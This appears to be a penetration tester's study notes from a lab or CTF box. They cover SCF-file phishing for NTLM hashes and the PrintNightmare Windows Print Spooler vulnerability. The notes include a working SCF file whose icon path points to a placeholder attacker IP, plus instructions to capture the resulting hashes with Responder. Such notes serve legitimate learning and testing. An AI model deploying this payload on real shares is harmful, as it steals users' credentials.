

https://github.com/cube0x0/CVE-2021-1675/issues/1




- Things learnt
	- SCF files can be used to phish for hashes
	- always recheck your notes saif on previous enumeration
		-  This is regarding the print nightmare possibility
		- If one thing doesnt work it doesnt mean succumb to tunnel vision on it move to the other thing that you have in ur notes
- Things i will read about
	- Learn and understand what printnightmare is
	- Learn about ricoh driver exploit
		- Interactive services learn about that logon and shit so u dont get cancer again
	- Phishing with SCF files




# SCF files

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

- SCF files
	- An SCF file is a shell command file used by Windows Explorer. Windows Explorer uses SCF files to perform certain actions, such as opening a new Windows Explorer window or showing a user's desktop.
	- SCF files are not meant to be manually opened. Windows Explorer automatically loads and uses SCF files as needed.
	- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
	- Specify the url to point to your attacker IP and turn on responder
	- Saving the pentestlab.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the pentestlab.scf on the top of the share drive
	- When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.


# Print nightmare

- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."
	- exists when the Windows Print Spooler service improperly performs privileged file operations
	- An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges
	- An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

